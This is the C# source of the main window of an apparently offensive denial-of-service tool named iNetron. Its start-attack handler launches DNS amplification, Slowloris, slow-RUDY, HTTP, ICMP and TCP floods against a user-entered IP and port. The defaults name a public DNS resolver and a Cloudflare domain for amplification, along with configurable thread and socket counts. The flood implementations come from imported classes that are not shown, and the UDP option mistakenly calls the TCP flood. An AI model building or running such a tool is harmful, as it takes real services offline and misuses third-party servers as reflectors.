using System;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using iNetron.Core.Methods.Amp;
using iNetron.Core.Methods.App;
using iNetron.Core.Methods.Vol;

namespace iNetron.GUI
{
    public partial class mainWindow : Form
    {
        public mainWindow()
        {
            InitializeComponent();
            windowObject = this;
        }

        #region UI_CONTROL
        private void mainWindow_Load(object sender, EventArgs e)
        {
            this.SetStyle(ControlStyles.ResizeRedraw, true);
            this.SetStyle(ControlStyles.OptimizedDoubleBuffer, true);

            this.SetStyle(ControlStyles.AllPaintingInWmPaint
                 | ControlStyles.UserPaint | ControlStyles.DoubleBuffer, true);


            foreach (Control x in this.Controls)
            {
                typeof(Control).InvokeMember("DoubleBuffered",
                BindingFlags.SetProperty | BindingFlags.Instance | BindingFlags.NonPublic,
                null, x, new object[] { true });

                typeof(Control).InvokeMember("ResizeRedraw",
                BindingFlags.SetProperty | BindingFlags.Instance | BindingFlags.NonPublic,
                null, x, new object[] { true });
            }

            rtbLogger.Clear();
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(0, 96, 192)), 
                new Rectangle(0, this.ClientSize.Height - 1, this.ClientSize.Width, 1));
            base.OnPaint(e);    
        }
        protected override void WndProc(ref Message message)
        {
            base.WndProc(ref message);

            if (message.Msg == 0x0085)
            {
                if (m_aeroEnabled)
                {
                    var v = 2;
                    DwmSetWindowAttribute(this.Handle, 2, ref v, 4);
                    MARGINS margins = new MARGINS()
                    {
                        bottomHeight = 1,
                        leftWidth = 0,
                        rightWidth = 0,
                        topHeight = 0
                    };
                    DwmExtendFrameIntoClientArea(this.Handle, ref margins);
                }
            }
        }

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
        (
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse
        );

        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);

        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);

        [DllImport("dwmapi.dll")]
        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);

        private bool m_aeroEnabled;
        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }
        private bool CheckAeroEnabled()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                int enabled = 0;
                DwmIsCompositionEnabled(ref enabled);
                return (enabled == 1) ? true : false;
            }
            return false;
        }
        protected override CreateParams CreateParams
        {
            get
            {
                m_aeroEnabled = CheckAeroEnabled();

                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x02000000;

                if (!m_aeroEnabled)
                    cp.ClassStyle |= 0x00020000;

                return cp;
            }
        }

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void pnlTitlebar_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, 0xA1, 0x2, 0);
            }
        }
        private void btnExit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void btnMin_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                do
                {
                    this.Invoke(new Action(() => this.Opacity -= 0.1));
                    Thread.Sleep(10);
                }
                while (this.Opacity > 0.1);

                this.Invoke(new Action(() => this.WindowState = FormWindowState.Minimized));
                this.Invoke(new Action(() => this.Opacity = 1.00));

            }).Start();
        }

        private void lblTitle_Click(object sender, EventArgs e)
        {
            this.Invalidate();
        }
        private void mainWindow_Activated(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                Thread.Sleep(500);
                this.Invoke(new Action(() => this.Invalidate()));

            }).Start();
        }
        #endregion
        #region EVENT_LOGGING
        public enum EventType
        {
            Error,
            Warning,
            Info,
            Unknown
        }
        private void AppendWithColor(string text, Color color)
        {
            rtbLogger.SelectionStart = rtbLogger.TextLength;
            rtbLogger.SelectionLength = 0;

            rtbLogger.SelectionColor = color;
            rtbLogger.AppendText(text);
            rtbLogger.SelectionColor = rtbLogger.ForeColor;
        }

        public static mainWindow windowObject = null;
        private delegate void LogEventDelegate(string message, EventType type);
        public static void LogEventExternal(string message, EventType type)
        {
            if (windowObject != null)
                windowObject.LogEvent(message, type);
        }
        private void LogEvent(string message, EventType type)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new LogEventDelegate(LogEvent), new object[] { message, type });
                return;
            }

            var currentTime = DateTime.Now;

            var currentMinute = currentTime.Minute.ToString();
            var currentHour = currentTime.Hour.ToString();

            var pFixPrompt = currentHour + ":" + currentMinute;

            switch (type)
            {
                case EventType.Error:
                    AppendWithColor(pFixPrompt, Color.Red);
                    break;
                case EventType.Warning:
                    AppendWithColor(pFixPrompt, Color.Gold);
                    break;
                case EventType.Info:
                    AppendWithColor(pFixPrompt, Color.Lime);
                    break;
                case EventType.Unknown:
                default:
                    AppendWithColor(pFixPrompt, Color.White);
                    break;
            }

            AppendWithColor(" > " + message + '\n', Color.White);
        }
        #endregion

        private static bool AllowedToRun = false;

        private void btnStartAtk_Click(object sender, EventArgs e)
        {
            if (!AllowedToRun)
                LogEvent("Start-DoS | Unauthorized", EventType.Error);
            else if(AllowedToRun)
            {
                if ((int)CurrentAttack == -1)
                    return;

                LogEvent("Start-DoS | Authorized - Attempting to start . . .", EventType.Info);

                try
                {
                    btnStartAtk.Enabled = false;

                    switch((int)CurrentAttack)
                    {
                        case 1:
                            new dns(targetIP.ToString(), c_dnsIP.ToString(), c_opt_dnsDomain, 53, 53, c_dnsIPv6).Start();
                            break;
                        case 3:
                            new loris(targetIP.ToString(), c_lsh_https, c_lshtu_port).createLoris(c_lsh_socks, c_lsh_ua);
                            break;
                        case 4:
                            new srudy(targetIP.ToString(), c_lsh_https, c_lshtu_port).createSRudy(c_lsh_socks, c_lsh_ua);
                            break;
                        case 6:
                            new http(c_lsh_ua, targetIP.ToString(), c_lsh_https, c_lshtu_port).createHttp(c_lsh_socks);
                            break;
                        case 7:
                            new icmp(targetIP.ToString(), c_itu_sz, c_itu_thrds).floodNow();
                            break;
                        case 8:
                            new tcp(targetIP.ToString(), c_lshtu_port, c_itu_sz, c_itu_thrds).floodNow();
                            break;
                        case 9:
                            new tcp(targetIP.ToString(), c_lshtu_port, c_itu_sz, c_itu_thrds).floodNow();
                            break;
                    }

                }
                catch
                {
                    LogEvent("Error | A problem occurred. Likely due to bad configuration settings.", EventType.Error);
                }
                finally
                {
                    LogEvent("Notice | Attack may be running on another thread so information can't be gathered. Sorry.", EventType.Warning);
                    btnStartAtk.Enabled = true;
                }
            }
        }

        private void btnStopAtk_Click(object sender, EventArgs e)
        {
            AllowedToRun = false;

            btnStartAtk.FlatAppearance.BorderColor = Color.Red;
            btnStartAtk.ContextMenuStrip = rMenu;

            Application.Restart();
        }

        private void btnNewInst_Click(object sender, EventArgs e)
        {
            LogEvent("Start-New-Instance | " + Application.ExecutablePath, EventType.Info);
            Process.Start(Application.ExecutablePath);
        }


        private enum Selection
        {
            INVALID_OPTION = -1,
            BAD_AMP = 0,
            DNS = 1,
            BAD_APP = 2,
            SL = 3,
            SR = 4,
            BAD_VOL = 5,
            HTTP = 6,
            ICMP = 7,
            TCP = 8,
            UDP = 9
        }

        private Selection CurrentAttack = (Selection)(-1);

        // Default 'Loopback' Address
        private IPAddress targetIP = IPAddress.Parse("127.0.0.1");

        // Yandex DNS (it doesn't work for amp, but who cares?)
        private IPAddress c_dnsIP = IPAddress.Parse("77.88.8.8");
        private bool c_dnsIPv6 = false;

        // There are a lot of these servers!
        private string c_opt_dnsDomain = "sni.cloudflaressl.com";

        private bool c_lsh_https = false;

        private int c_lshtu_port = 80;

        private const int df_http = 80;
        private const int df_https = 443;
        private const int df_tcpudp = 6975;

        private int c_lsh_socks = 200;
        private string c_lsh_ua = "unknown.device";

        private int c_itu_sz = 6550;
        private int c_itu_thrds = 8;            

        private void i_option_selector_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch((Selection)i_option_selector.SelectedIndex)
            {
                case Selection.BAD_AMP:
                case Selection.BAD_APP:
                case Selection.BAD_VOL:
                    MessageBox.Show("The object you selected is not a valid attack option but a category.", "Invalid Choice", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    CurrentAttack = Selection.INVALID_OPTION;
                    i_option_selector.SelectedIndex = -1;
                    break;
                default:
                    CurrentAttack = (Selection)i_option_selector.SelectedIndex;
                    break;
            }
        }

        private void txtIP_ADDR_TextChanged(object sender, EventArgs e)
        {
            if (IPAddress.TryParse(txtIP_ADDR.Text, out targetIP))
                LogEvent("IP-Change | Success", EventType.Info);
            else
                LogEvent("IP-Change | Cannot Parse", EventType.Error);
        }

        private void unblockINetronToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var allow = SafeAction.Allow();

            if (allow)
            {
                btnStartAtk.FlatAppearance.BorderColor = Color.Lime;
                btnStartAtk.ContextMenuStrip = null;

                LogEvent("Authorize-DoS | Allowed", EventType.Info);
            }
            else
                LogEvent("Authorize-DoS | Denied", EventType.Warning);

            AllowedToRun = allow;
        }

        private void clearLogsToolStripMenuItem_Click(object sender, EventArgs e) => rtbLogger.Text = "";
        private void undoToolStripMenuItem_Click(object sender, EventArgs e) => rtbLogger.Undo();
        private void redoToolStripMenuItem_Click(object sender, EventArgs e) => rtbLogger.Redo();
        private void clearURBufferToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("You cannot restore the log contents after you clear the buffer object. Are you sure?",
                "Confirm Clear Buffer", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                rtbLogger.ClearUndo();
        }

        private void txtPort_TextChanged(object sender, EventArgs e)
        {
            if (int.TryParse(txtPort.Text, out c_lshtu_port))
                LogEvent("Port-Change | Success", EventType.Info);
            else
                LogEvent("Port-Change | Cannot Parse", EventType.Error);
        }

        private void txtDomain_TextChanged(object sender, EventArgs e)
        {
            c_opt_dnsDomain = txtDomain.Text;
            LogEvent("Domain-Change | Updated", EventType.Info);
        }

        private void txtDNSIP_TextChanged(object sender, EventArgs e)
        {
            if (IPAddress.TryParse(txtDNSIP.Text, out c_dnsIP))
                LogEvent("DNS-IP-Change | Success", EventType.Info);
            else
                LogEvent("DNS-IP-Change | Cannot Parse", EventType.Error);
        }

        private void txtUA_TextChanged(object sender, EventArgs e)
        {
            c_lsh_ua = txtUA.Text;
            LogEvent("UserAgentString-Change | Updated", EventType.Info);
        }

        private void txtSz_TextChanged(object sender, EventArgs e)
        {
            if (int.TryParse(txtSz.Text, out c_itu_sz))
                LogEvent("Size-Change | Success", EventType.Info);
            else
                LogEvent("Size-Change | Cannot Parse", EventType.Error);
        }

        private void txtThreads_TextChanged(object sender, EventArgs e)
        {
            if (int.TryParse(txtThreads.Text, out c_itu_thrds))
                LogEvent("Threads-Change | Success", EventType.Info);
            else
                LogEvent("Threads-Change | Cannot Parse", EventType.Error);
        }

        private void txtSock_TextChanged(object sender, EventArgs e)
        {
            if (int.TryParse(txtSock.Text, out c_lsh_socks))
                LogEvent("Sock-Change | Success", EventType.Info);
            else
                LogEvent("Sock-Change | Cannot Parse", EventType.Error);
        }

        private void chki6_CheckedChanged(object sender, EventArgs e)
        {
            c_dnsIPv6 = chki6.Checked;
        }

        private void chkSec_CheckedChanged(object sender, EventArgs e)
        {
            c_lsh_https = chkSec.Checked;

            if (c_lsh_https)
                txtPort.Text = "443";
            else
                txtPort.Text = "80";
        }
    }
}